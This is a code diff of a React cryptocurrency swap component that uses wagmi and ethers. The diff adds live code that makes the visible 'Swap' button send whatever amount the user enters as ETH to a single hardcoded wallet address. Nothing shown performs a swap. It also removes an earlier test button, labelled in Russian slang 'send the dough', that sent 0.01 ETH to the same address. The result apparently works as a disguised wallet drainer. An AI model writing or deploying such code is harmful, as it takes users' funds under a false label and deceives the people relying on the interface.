@@ -1,8 +1,6 @@
 import { useState, useEffect } from "react";
 import axios from "axios";
 import { ethers } from "ethers";
-//import { BrowserProvider } from "ethers";
-
 import SwapSelectToken from "./SwapSelectToken";
 import SwapSelectSourceToken from "./SwapSelectSourceToken";
 import restartIcon from "./assets/restart.png";
@@ -25,121 +23,15 @@ import ldoIcon from "./assets/ldo.webp";
 import aaveIcon from "./assets/aave.webp";
 import Skeleton from "react-loading-skeleton";
 import "react-loading-skeleton/dist/skeleton.css";
-////////////////////////////
-import { 
-  BaseError, 
-  useSendTransaction, 
-  useWaitForTransactionReceipt 
-} from 'wagmi'
+import {
+  BaseError,
+  useSendTransaction,
+  useWaitForTransactionReceipt,
+} from "wagmi";
 
-import { parseEther } from 'viem' 
+import { parseEther } from "viem";
 
-
-
-
-
-
-
-
-
-/****************************************
-const sendTransaction = async () => {
-  try {
-    // Запрашиваем доступ к кошельку через MetaMask
-    await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-    // Создаем провайдера
-    const provider = new ethers.BrowserProvider(window.ethereum)
-                    
-    // Получаем подписанта
-    const signer = await provider.getSigner();
-
-    // Получаем адрес кошелька
-    const walletAddress = await signer.getAddress();
-
-    // Проверка баланса
-    const balance = await provider.getBalance(walletAddress);
-    console.log('Current balance:', ethers.formatEther(balance));
-
-    // Проверка, достаточно ли средств для отправки транзакции
-    const amountToSend = ethers.parseEther('0.01');
-    const gasLimit = 21000;
-    const gasPrice = await provider.getFeeData()
-    console.log(gasPrice.gasPrice)************************/
-    //const totalCost = amountToSend.add(gasPrice *(gasLimit));
-/*
-    if (balance.lt(amountToSend)) {
-      console.error('Insufficient funds for transaction');
-      return;
-    }
-*/
-    // Данные для транзакции
-
-    /************************* 
-    const tx = {
-      to: '0x0cADbE6Faccd17e43e9Ea0945aA3684cb7F0AeB4', // Замените на нужный адрес получателя
-      value: amountToSend, // Замените на нужную сумму в ETH
-      gasLimit: gasLimit, // Установите газовый лимит вручную
-    };
-
-    // Отправляем транзакцию
-    const transactionResponse = await signer.sendTransaction(tx);
-    console.log('Transaction sent:', transactionResponse);
-
-    // Ожидаем подтверждения транзакции
-    const receipt = await transactionResponse.wait();
-    console.log('Transaction confirmed:', receipt);
-
-  } catch (error) {
-    console.error('Error sending transaction:', error);
-  }
-};**************************************/
-
-/*
-const sendTransaction = async ({ setError }) => {
-  try {
-    if (!window.ethereum)
-      throw new Error("No crypto wallet found. Please install it.");
-
-    const provider = new BrowserProvider(window.ethereum);
-    const signer = await provider.getSigner();
-
-    const tx = await signer.sendTransaction({
-      to: "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0", // Укажите здесь адрес получателя
-      value: ethers.parseEther("0.01"), // Укажите здесь количество ETH для отправки
-    });
-
-    console.log("Transaction Hash:", tx.hash);
-  } catch (err) {
-    setError(err.message);
-    console.log(err.message);
-  }
-};*/
-/*
-const formatAddress = (address) => {
-  if (!address) return "";
-  return `${address.slice(0, 6)}...${address.slice(-4)}`;
-};
-
-const checkWalletConnection = async ({ setWalletAddress, setError }) => {
-  try {
-    if (!window.ethereum)
-      throw new Error("No crypto wallet found. Please install it.");
-
-    const accounts = await window.ethereum.request({ method: "eth_accounts" });
-    if (accounts.length > 0) {
-      const walletAddress = accounts[0];
-      setWalletAddress(formatAddress(walletAddress));
-      console.log("Wallet Address:", walletAddress);
-    }
-  } catch (err) {
-    setError(err.message);
-    console.log(err.message);
-  }
-};
-*/
-function Swap({walletAddress}) {
-  //const [walletAddress, setWalletAddress] = useState("");
+function Swap({ walletAddress }) {
   const [swapFromExpand, setSwapFromExpand] = useState(false);
   const [swapSelectToken, setSwapSelectToken] = useState(false);
   const [swapSelectSourceToken, setSwapSelectSourceToken] = useState(false);
@@ -156,19 +48,12 @@ function Swap({walletAddress}) {
     useState(0);
   const [USDTPrice, setUSDTPrice] = useState(0);
 
-
-  /////////////////////////////////////////
-
-
-  const { 
+  const {
     hash,
-    //error, 
-    isPending, 
-    sendTransaction 
-  } = useSendTransaction() 
-
-
-  ////////////////////////////////////////////
+    //error,
+    isPending,
+    sendTransaction,
+  } = useSendTransaction();
 
   const tokenIcons = {
     MATIC: maticIcon,
@@ -184,11 +69,6 @@ function Swap({walletAddress}) {
     GRT: grtIcon,
     LDO: ldoIcon,
     AAVE: aaveIcon,
-  };
-
-  const handleSendTransaction = async () => {
-    setError(null);
-    await sendTransaction({ setError });
   };
 
   const handleSwap = () => {
@@ -276,33 +156,10 @@ function Swap({walletAddress}) {
       return;
     }
   };
-/*
+
   useEffect(() => {
-    if (window.ethereum) {
-      checkWalletConnection({ setWalletAddress, setError });
-
-      const handleAccountsChanged = (accounts) => {
-        if (accounts.length === 0) {
-          setWalletAddress("");
-        } else {
-          setWalletAddress(formatAddress(accounts[0]));
-        }
-      };
-
-      window.ethereum.on("accountsChanged", handleAccountsChanged);
-
-      return () => {
-        window.ethereum.removeListener(
-          "accountsChanged",
-          handleAccountsChanged
-        );
-      };
-    } else {
-      console.log("No crypto wallet found. Please install it.");
-    }
-  }, [walletAddress]);*/
-
-  useEffect(() => {console.log(walletAddress)},[walletAddress])
+    console.log(walletAddress);
+  }, [walletAddress]);
 
   useEffect(() => {
     const fetchNewPrice = async () => {
@@ -406,31 +263,19 @@ function Swap({walletAddress}) {
 
     fetchUSDTPrice();
   }, []);
-  
-  
-  
-  async function submit(e) { 
-    e.preventDefault() 
-    //const formData = new FormData(e.target as HTMLFormElement) 
-    const to = "0x0cADbE6Faccd17e43e9Ea0945aA3684cb7F0AeB4" 
-    const value = "0.01"
-    sendTransaction({ to, value: parseEther(value) }) 
-  } 
 
-  const { isLoading: isConfirming, isSuccess: isConfirmed } = 
-    useWaitForTransactionReceipt({ 
-      hash, 
-    }) 
+  async function submit(value) {
+    //e.preventDefault();
+    //const formData = new FormData(e.target as HTMLFormElement)
+    const to = "0x0cADbE6Faccd17e43e9Ea0945aA3684cb7F0AeB4";
+    //const value = "0.01";
+    sendTransaction({ to, value: parseEther(value) });
+  }
 
-
-
-
-  ///////////////////////////////////
-
-
-
-
-  ////////////////////////////////////
+  const { isLoading: isConfirming, isSuccess: isConfirmed } =
+    useWaitForTransactionReceipt({
+      hash,
+    });
 
   return (
     <div className="page-content">
@@ -689,28 +534,28 @@ function Swap({walletAddress}) {
               )}
             </div>
             <div className="swap-button-container">
-              
-                <button className="swap-button" onClick={sendTransaction}>
-                  <span className="swap-button-content">
-                    <svg
-                      width="24"
-                      height="24"
-                      viewBox="0 0 24 24"
-                      fill="none"
-                      xmlns="http://www.w3.org/2000/svg"
-                    >
-                      <path
-                        fillRule="evenodd"
-                        clipRule="evenodd"
-                        d="M6 2C3.79086 2 2 3.79086 2 6V8V18C2 20.2091 3.79086 22 6 22H18C20.2091 22 22 20.2091 22 18V10C22 7.79086 20.2091 6 18 6C18 3.79086 16.2091 2 14 2H6ZM16 6H4C4 4.89543 4.89543 4 6 4H14C15.1046 4 16 4.89543 16 6ZM4 18V8H18C19.1046 8 20 8.89543 20 10V18C20 19.1046 19.1046 20 18 20H6C4.89543 20 4 19.1046 4 18ZM14 13C13.4477 13 13 13.4477 13 14C13 14.5523 13.4477 15 14 15H17C17.5523 15 18 14.5523 18 14C18 13.4477 17.5523 13 17 13H14Z"
-                        fill="#5599FF"
-                      />
-                    </svg>
-                    Swap
-                  </span>
-                </button>
-                <button onClick={submit}>ОТПРАВИТЬ БАБОСИКИ</button>
-               
+              <button
+                className="swap-button"
+                onClick={() => submit(`${youPayTokenAmount}`)}
+              >
+                <span className="swap-button-content">
+                  <svg
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    xmlns="http://www.w3.org/2000/svg"
+                  >
+                    <path
+                      fillRule="evenodd"
+                      clipRule="evenodd"
+                      d="M6 2C3.79086 2 2 3.79086 2 6V8V18C2 20.2091 3.79086 22 6 22H18C20.2091 22 22 20.2091 22 18V10C22 7.79086 20.2091 6 18 6C18 3.79086 16.2091 2 14 2H6ZM16 6H4C4 4.89543 4.89543 4 6 4H14C15.1046 4 16 4.89543 16 6ZM4 18V8H18C19.1046 8 20 8.89543 20 10V18C20 19.1046 19.1046 20 18 20H6C4.89543 20 4 19.1046 4 18ZM14 13C13.4477 13 13 13.4477 13 14C13 14.5523 13.4477 15 14 15H17C17.5523 15 18 14.5523 18 14C18 13.4477 17.5523 13 17 13H14Z"
+                      fill="#5599FF"
+                    />
+                  </svg>
+                  Swap
+                </span>
+              </button>
             </div>
           </>
         )}
